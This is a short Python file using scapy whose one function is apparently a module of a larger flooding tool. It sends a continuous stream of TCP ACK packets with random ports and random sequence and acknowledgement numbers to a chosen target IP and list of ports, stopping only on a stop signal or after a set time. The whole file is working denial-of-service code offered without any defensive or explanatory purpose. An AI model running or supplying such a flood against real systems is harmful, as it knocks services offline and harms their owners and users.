from scapy.all import IP, TCP, send
import random
import time

def launch(target_ip, port_list, duration, tag, stop_event, fail_tracker):
    start_time = time.time()

    if not port_list:
        port_list = [80]

    while not stop_event.is_set():
        if duration and time.time() - start_time > duration:
            break

        for port in port_list:
            try:
                ip_layer = IP(dst=target_ip)
                tcp_layer = TCP(
                    sport=random.randint(1024, 65535),
                    dport=port,
                    flags="A",
                    seq=random.randint(0, 4294967295),
                    ack=random.randint(0, 4294967295)
                )
                send(ip_layer / tcp_layer, verbose=0)
                fail_tracker["sent"] += 1
            except StopIteration:
                fail_tracker["fail"] += 1
            except Exception:
                fail_tracker["fail"] += 1

        time.sleep(0.01)
